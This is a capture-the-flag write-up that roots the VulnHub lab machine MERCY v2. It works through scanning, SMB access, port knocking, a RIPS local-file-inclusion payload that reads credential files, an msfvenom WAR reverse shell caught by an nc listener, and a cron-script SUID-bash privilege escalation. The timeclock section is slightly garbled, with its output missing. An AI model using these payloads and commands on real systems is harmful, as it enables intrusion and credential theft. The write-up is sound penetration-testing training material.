title: VulnHub - digitalworld.local MERCY v2
---

**Description:** Is a machine dedicated to Offensive Security for the PWK course.

**Author:** Donavan

**Operating System:** Linux

**Aim:** To get root shell.

**Download:** [https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/](https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/)

## Informtion Gathering
### Host Discovery
First we identify the ip address of the target, as shown below:

``` bash
root@kali:~$ nmap -n -sn 192.168.179.* 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 19:24 -05
Nmap scan report for 192.168.179.132
Host is up (0.00070s latency).
MAC Address: 00:0C:29:3B:F2:CE (VMware)
Nmap scan report for 192.168.179.254
Host is up (0.00024s latency).
MAC Address: 00:50:56:F6:A4:B3 (VMware)
Nmap scan report for 192.168.179.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 6.00 seconds
```

### Port Scanning
Then I proceed to perform a port scan with the purpose to detect open ports.

``` bash
root@kali:~$ nmap -n -T5 -p1-65535 -v 192.168.179.132 -oG nmap-tcp-all-ports.txt
...
PORT     STATE    SERVICE
22/tcp   filtered ssh
53/tcp   open     domain
80/tcp   filtered http
110/tcp  open     pop3
139/tcp  open     netbios-ssn
143/tcp  open     imap
445/tcp  open     microsoft-ds
993/tcp  open     imaps
995/tcp  open     pop3s
8080/tcp open     http-proxy
MAC Address: 00:0C:29:3B:F2:CE (VMware)
```
As we see in the output the ports 22 and 80 are filtered, it will be that the firewall rules are intervening.

### Service Enumeration
With nmap we carry out the enumeration of versions and services.

``` bash
root@kali:~$ nmap -sV -sC -v -p53,110,139,143,445,993,995,8080 192.168.179.132 -oN tcp-services.txt

```

### Samba Enumeration

The following instruction lists the shared resources of the samba service.

``` bash
root@kali:~$ smbmap -H 192.168.179.132
[+] Guest session       IP: 192.168.179.132:445 Name: unknown 
    Disk                       Permissions     Comment
    ----                       -----------     -------
    print$                     NO ACCESS       Printer Drivers
    qiu                        NO ACCESS
    IPC$                       NO ACCESS       IPC Service (MERCY server (Samba, Ubuntu))
```

Then we enumerate the samba users and domains.

``` bash
root@kali:~$ rpcclient 192.168.179.132 -U "" -N
rpcclient $> enumdomusers
user:[pleadformercy] rid:[0x3e8]
user:[qiu] rid:[0x3e9]
rpcclient $> enumdomains
name:[MERCY] idx:[0x0]
name:[Builtin] idx:[0x1]
```

### Enumerating Port 8080

Browsing the web service on port 8080 we find the tomcat index page.

![](/assets/images/mercy/screenshot-1.png)

Then we check the robots file on the web page and find the following resource:

![](/assets/images/mercy/screenshot-2.png)

We request the resource **/tryharder/tryharder** and we find content encode in base64.

![](/assets/images/mercy/screenshot-3.png)

We download the base64 file and decode it, and I find a message where it especifies that one of the employes is using as password **password**. 

``` bash
root@kali:~$ wget http://192.168.179.132:8080/tryharder/tryharder
root@kali:~$ base64 -d tryharder 
It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.

Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.

No fluffy bunnies for those who set insecure passwords and endanger the enterprise.
```

### Accessing the Samba Service

I try to access the samba service with the credentials **qiu:password** and we access this.

``` bash
root@kali:~$ smbclient //192.168.179.132/qiu -U 'qiu'
Enter WORKGROUP\qiu's password:

Try "help" to get a list of possible commands.
smb: \> ls

  .private                           DH        0  Sun Aug 26 11:35:34 2018
  .bash_logout                        H      220  Sun Aug 26 08:19:34 2018
  .profile                            H      675  Sun Aug 26 08:19:34 2018
```

For convenience I will mount the shared resource to the attacking machine as shown in the following instructions: 

``` bash
root@kali:~$ /mnt/smb
root@kali:~$ mount -t cifs //192.168.179.132/qiu  /mnt/smb -o username=qiu,password=password,rw 
root@kali:~$ cd /mnt/smb 
```
I found in the following path a file with system configurations, including the knocking daemon configuration, as we can see in the following output the port sequence that we have to try to connect to open ports 80 and 22.

``` bash
root@kali:/mnt/smb$ cat .private/opensesame/config

        seq_timeout = 100

[openSSH]                                                                    
        sequence    = 17301,28504,9999                                    
        seq_timeout = 100                                                    
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn                                                  
                                                                              
[closeSSH]                                                                   
        sequence    = 9999,28504,17301                                        
        seq_timeout = 100                                                    
        command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn 
...
```

I developed a small port knocking script in python, as shown below:

```python
#!/usr/bin/env python3

import socket,sys

if len(sys.argv) != 5:
    print(f"Usage: {sys.argv[0]} [Ip] [Port1 Port2 Port3]")
    sys.exit(0)

def connection(ip,port):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
    except:
        pass

ip=sys.argv[1]

if __name__=="__main__":
    for port in sys.argv[2:]:
        connection(ip,int(port))

    print("Done")
```

We execute the script as follows to open ports 22 and 80.

``` bash
root@kali:~$ ./knoking.py 192.168.179.132 159 27391 4
Done
root@kali:~$ ./knoking.py 192.168.179.132 17301 28504 9999
Done
```

We check that ports 22 and 80 are open.

``` bash
root@kali:~$ nmap -n -p22,80 192.168.179.132              
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

### Enumerating Port 80

I browse the web page and I can't find something interesting.

![](/assets/images/mercy/screenshot-4.png)

I executed gobuster for enumerate hidden files and directories.

``` bash
root@kali:/mnt/smb$ gobuster dir -u http://192.168.179.132/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt -e
...
http://192.168.179.132/time                 (Status: 200) [Size: 79]
http://192.168.179.132/robots.txt           (Status: 200) [Size: 50]
```

Checking the robots file I find two directories, as shown in the following  picture:

![](/assets/images/mercy/screenshot-5.png)

When I request the **nomercy** resource it redirects me to the RIPS page that's a static source code analyser for vulnerabilities.

![](/assets/images/mercy/screenshot-6.png)

Searching for vulnerabilities for this RIPS version, I found that this is vulnerable to Local File Inclusion, so I downloaded the exploit database proof of concept, as shown below:

``` bash
root@kali:~$ wget https://www.exploit-db.com/download/18660
root@kali:~$ cat 18660
# RIPS <= 0.53 Multiple Local File Inclusion Vulnerabilities

File: /windows/code.php
=======================

102: file $lines = file($file);
    96: $file = $_GET['file'];

PoC:
http://localhost/rips/windows/code.php?file=../../../../../../etc/passwd

File: /windows/function.php
===========================

    64: file $lines = file($file);
        58: $file = $_GET['file'];

PoC:
http://localhost/rips/windows/function.php?file=../../../../../../etc/passwd(will
read the first line of the file)
```


## Exploitation

### Local File Inclusion

We perform the following request with the browser to verify the proof of concept, and we comprobe that it's vulnerable.

``` bash
http://192.168.179.132/nomercy/windows/code.php?file=../../../../../../etc/passwd 
```

![](/assets/images/mercy/screenshot-7.png)

If we remember Tomcat has a file where its users are defined, this is located in **/etc/tomcat7/tomcat-users.xml**, so let's download its content.

``` bash
http://192.168.179.132/nomercy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml
```

![](/assets/images/mercy/screenshot-8.png)

And we found two usernames with their passwords.

### Tomcat Web Page

I tried log in with this credentials to SSH service but this doesn't work, so I logged into the Tomcat **manager-webapp** with the username **thisisasuperduperlonguser** and password **heartbreakisinevitable**.

![](/assets/images/mercy/screenshot-9.png)

Logged into the administration panel we need to upload a reverse shell, on the attacking machine we create a war reverse shell as shown below:

``` bash
root@kali:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.179.1 LPORT=443 -f war -o reverse.war
```

Created our reverse shell we have to upload it, as shown in the following pictures:

![](/assets/images/mercy/screenshot-10.png)

![](/assets/images/mercy/screenshot-11.png)

**Getting a reverse shell**

Ones our war reverse shell is uploaded, we need set up an nc listener on port 443 waiting for incoming connections.

``` bash
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
```
Then we perform the following curl request and we get a shell, also with python we spawn a TTY shell, as shown below:

``` bash
root@kali:~$ curl -s 'http://192.168.179.132:8080/reverse/'
```

``` bash
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.132] 50554

```
Enumerating in the web root directory we find the **time** file that contains the current date, it's possible that a cron job is redirecting the results to this file, and if we see the date when listing this file, the last time that it was modified, it was a few moments ago.

``` bash
tomcat7@MERCY:/var/www/html$ ls -la
...
-rw-r--r-- 1 www-data www-data   79 May  2 23:36 time
```
We switch to the user **fluffy**.

``` bash
tomcat7@MERCY:/var/www/html$ su fluffy
Password: freakishfluffybunny

$ bash
fluffy@MERCY:/var/www/html$ 
```
In the patrick home directory I found the **.private/secret/timeclock** file, that contains a bash script the same that redirects the date, other text and assigns www-data permissions to the **time** file, as shown below:

``` bash
fluffy@MERCY:~/.private/secrets$ cat timeclock

## Privilege Escalation

### Abussing cron job

To get root we copy the bash binary to the /temp directory, we assign SUID permissions and redirect to the **timeclock** file, a few moments later we see that the bash binary is in the /temp directory and finally we execute it and we get root.

``` bash
fluffy@MERCY:~/.private/secrets$ echo 'cp /bin/bash /tmp/ && chmod 4777 /tmp/bash' >> timeclock
fluffy@MERCY:~/.private/secrets$ ls -la /tmp/bash
-rwsrwxrwx 1 root root 986672 May  2 16:48 /tmp/bash
fluffy@MERCY:~/.private/secrets$ /tmp/bash -p
bash-4.3# id
uid=1003(fluffy) gid=1003(fluffy) euid=0(root) groups=0(root),1003(fluffy)
bash-4.3# cat /root/proof.txt
Congratulations on rooting MERCY. :-)
```
